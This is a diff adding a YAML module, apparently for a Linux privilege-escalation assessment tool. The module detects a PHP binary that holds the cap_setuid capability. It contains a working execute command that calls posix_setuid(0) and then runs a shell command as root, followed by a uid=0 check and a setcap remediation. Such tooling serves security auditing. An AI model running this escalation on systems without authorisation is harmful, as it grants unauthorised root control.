@@ -1,0 +1,28 @@
+# cap_setuid on php → root
+technique: T1548.001
+name: cap_setuid on php → root
+tactic: [privilege-escalation]
+platform: [linux]
+ranking:
+  exploitability: high
+  safety: read-only
+  detection: quiet
+detect:
+  capability_on_binary:
+    binary: php
+    cap: cap_setuid
+execute:
+  command: "{{binary}} -r 'posix_setuid(0);system(\"id\");'"
+verify:
+  success: "uid=0"
+cleanup:
+  command: ""
+report:
+  vector_type: capability
+  evidence: "getcap: {{binary}} cap_setuid"
+  description: >
+    PHP with cap_setuid can promote to uid=0 via posix_setuid(0),
+    then shell out as root.
+  remediation: >
+    Remove the capability (`setcap -r $(which php)`).
+  refs: [T1548.001, capabilities(7), setcap]
